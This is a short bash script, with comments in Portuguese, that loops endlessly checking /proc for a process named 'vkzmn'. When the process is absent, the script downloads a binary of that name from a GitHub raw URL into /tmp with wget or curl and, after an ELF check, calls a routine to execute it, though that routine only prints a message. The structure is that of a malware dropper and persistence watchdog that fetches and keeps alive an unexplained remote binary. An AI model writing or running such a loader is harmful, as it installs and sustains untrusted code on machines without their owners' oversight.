

execute_vkzmn() {


echo executando vkzmn


exit



}





#############################################################

check_file() {

#chek vkzmn  is instaledd in /tmp


ls /tmp/vkzmn   

if (( $? )) ; then

echo vkzmn not found

check_wget_curl 


else 

echo  vkzmn ja esta em /tmp

magic

fi ; 

}


#############################################################



magic() {  #check  if file is  ELF



elf=0

hex_dump_vkzmn=$(file  /tmp/vkzmn)

for h in $hex_dump_vkzmn ; do

echo $h


if [[ $h  =  "ELF" ]] ; then

elf=1

else 

echo "" #nao e um elf valido

fi ;

done

if (( $elf )) ; then

echo e um elf valido

execute_vkzmn

fi;


}





####################################################################

down_curl() {

echo usando o curl

curl  -L https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn -o /tmp/vkzmn

check_file


}








####################################################################

down_wget() {


echo usando wget

wget https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn -O /tmp/vkzmn

check_file



}


#########################################################################


check_wget_curl() {



command -v wget 


if (( $? )) ; then #if last err not  0  wget not found

echo wget not found

else

down_wget      #wget ok

exit

fi;


command -v curl  


if (( $?  )) ; then  #if last  err  not 0  curl not found

echo curl not found


else


down_curl #curl ok

fi;


}



# -------------------------------------------




main() {


true=1000

while true ; do

vkzmn_ok=0

dir_proc=$( ls  /proc )

for  pid  in   $dir_proc ; do

if  ((  $pid  >  0  )) ; then

comm=$( cat  /proc/$pid/comm )

for  cc in  $comm ; do

if [ $cc  =  "vkzmn" ] ; then

vkzmn_ok=$true

fi ; 
               
done

fi; 

done

if   [  $vkzmn_ok   -eq    $true   ]  ; then

echo vkzmn_ok

else 

echo  vkzmn_not_ok

check_file   

fi ; 


done

}


main
 
#execute_vkzmn
